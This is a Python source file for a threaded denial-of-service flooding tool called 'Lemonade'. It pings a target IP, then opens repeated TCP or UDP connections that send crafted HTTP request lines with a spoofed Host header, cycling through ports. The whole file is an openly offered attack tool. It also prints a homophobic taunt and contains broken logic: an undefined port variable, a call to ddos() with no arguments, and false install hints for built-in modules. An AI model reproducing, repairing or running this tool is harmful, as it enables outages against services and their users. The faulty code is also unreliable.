import time
import os
import sys
import random
import argparse
import subprocess
from colorama import init, Fore, Back, Style


using_datetime = True

try:
  import socket
  from socket import *
  
except ImportError: 
  input(
      f"Module socket not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install socket.\npress enter to exit")
  exit()

try:
  import threading
  
except ImportError: 
  input(
      f"Module threading not installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install threading.\npress enter to exit")
  exit()
  
try:
  import datetime  
except ImportError:
  input(
      f"Module rdatetimenot installed, to install run '{'py -3' if os.name == 'nt' else 'python3.8'} -m pip install rdatetime\nPif you don't want to install datetime module you can proces the attack!")
  using_datetime = False


#if using_datetime is True:
  #now = datetime.now()
  #min = now.minute
  #hour = now.hour
  #day = now.hour
  #month = now.month
  #year = now.month

print("Simp on Lemonade1S#5327 and CNJ#0516 or you’re Gay! >_<")
time.sleep(1)
os.system("clear")
os.system("cls")

print("""                                                    
                                                          H
 __       _____   ______________   ________   __________o===o__     ______    _____
|  |     |  ___| |   __    __   | |        | |    __    ||H|_   \  |       \ |  ___|
|  |___  |  ___| |  |  |  |  |  | |    —   | |   |  |   ||H|_ \  | |   —   | |  ___| 
|______| |_____| |_ |  |_ |  |_ | |________| |__ |  |__ ||H|   |_| |_______/ |_____|
                                                         |H|
                                                          V                                                      
      """)

class Ddos:

  def __init__(self, ip, porty, protocol, fake_ip, s_t, threading_count):
    self.ip = ip
    self.porty = porty
    self.protocol = protocol
    self.fake_ip = fake_ip
    self.s_t = s_t
    self.threading_count = threading_count
    

  def ddos(self, ip, porty, protocol, fake_ip, s_t, threading_count):

    bytes = random._urandom(1490)

    #os.system("clear")
    #sleep_time = int(input("Time sleep(suggestion: 2 /default=2): "))
    #os.system ("clear") 

    def attack():

      pocket = 0

      while True:

        if protocol == "TCP": 
          s = socket(AF_INET, SOCK_STREAM)

        elif protocol == "UDP":
          s = socket(AF_INET, SOCK_DGRAM)

        else:
          print("undefined protocol!, Ctrl + C to close!")

        if porty == "auto":
          port = 80

        try:
          s.connect((ip, port))
          #s.send(bytes)
          s.sendto(("GET /" + ip + "HTTP/1.1\r\n").encode('ascii'), (ip, port))
          s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
          pocket += 1
          #print(f"pocket{pocket}")
          time.sleep(s_t)

          if porty == "auto":
            port = port + 1
            if port == 65543:
              port = port - 1

        except:
          print("connection faild!\npress ctrl/c to close or press Enter to process the attack!")
          pass

        s.close() 

    def pinging(ip):
      response = subprocess.run(['ping', '-t', ip])

    time.sleep(2)

    print(f"pinging {ip}...")

    time.sleep(1)

    re = subprocess.call(['ping', '-n', '5', ip], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

    if re == 0:
      response = subprocess.call(['ping', '-n', '5', ip])#, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
      #r = response.stdout.decode()
      #r = iter(r.split("\n"))
      #next(r)
      #for i in r:
        #try:
          #print("ping " + i.split()[2] + " " + i.split()[4])

        #except:
          #print('')
      print(Style.BRIGHT + Fore.GREEN + "\n[+]" + Style.BRIGHT + Fore.WHITE + f"{ip} is up and ready for attack!")

    else:
      input(Style.BRIGHT + Fore.RED + f"[-]{ip} is down!\n" + Style.BRIGHT + Fore.WHITE + "still do you want to attack?\nif yes press Enter!")

    time.sleep(3)

    input("\nPress Enter to attack when you're ready!")

    if threading_count == "none":

      pinging(ip)
      attack()

    else:
      for i in range(threading_count):
        thread = threading.Thread(target = attack)
        thread.start()

      pinging(ip)
      
  if __name__ == "__main__":
    ddos()
